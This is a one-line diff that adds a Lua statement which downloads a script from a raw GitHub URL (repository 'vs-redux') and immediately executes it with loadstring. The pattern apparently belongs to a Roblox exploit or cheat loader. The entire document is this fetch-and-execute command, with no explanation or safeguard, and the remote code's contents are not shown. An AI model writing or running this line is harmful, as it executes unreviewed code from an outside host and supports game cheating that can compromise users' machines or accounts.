@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Iker7747/vs-redux/main/Main%202"))()
